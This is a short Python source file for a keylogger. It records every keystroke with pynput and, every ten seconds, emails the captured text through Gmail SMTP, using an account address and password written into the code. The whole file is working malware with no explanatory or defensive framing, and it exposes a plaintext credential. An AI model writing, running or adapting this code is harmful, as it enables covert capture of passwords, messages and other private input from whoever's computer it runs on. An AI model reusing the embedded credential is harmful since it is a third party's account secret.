import pynput.keyboard
import threading
import smtplib, ssl

email ="roshanscience100101@gmail.com"
password = "ikanfltkzglnjcdx"

content = ""
def process_key_strike(key):
    global content
    try:
        content = content + str(key.char)
    except AttributeError:
        if key == key.space:
            content = content + " "
        else:
            content = content + " " + str(key) + " "

def report():
    global content, email, password
    send_mail(email, password, content) 
    content = ""
    timer = threading.Timer(10, report)
    timer.start()

def send_mail(email, password, message):
    context=ssl.create_default_context()
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email,email, message)

my_listener = pynput.keyboard.Listener(on_press=process_key_strike)
with my_listener:
    report()
    my_listener.join() 

   
